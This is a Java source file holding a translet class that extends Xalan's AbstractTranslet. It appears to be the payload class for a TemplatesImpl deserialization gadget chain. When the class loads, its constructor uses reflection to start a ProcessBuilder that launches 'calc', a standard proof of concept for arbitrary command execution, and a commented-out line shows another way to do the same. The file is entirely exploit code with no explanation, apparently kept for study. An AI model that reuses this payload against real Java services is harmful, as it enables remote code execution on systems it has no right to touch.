package Javac;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.util.Arrays;
import java.util.List;

public class hello_tempImpl extends AbstractTranslet
{
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
    public hello_tempImpl()throws Exception
    {
        super();
        Class<?> classz=Class.forName("java.lang.ProcessBuilder");
//        classz.getMethod("start").invoke(classz.getConstructor(String[].class).newInstance(new String[][]{{"calc"}}));
        classz.getMethod("start").invoke(classz.getConstructor(List.class).newInstance(Arrays.asList("calc")));
    }
}
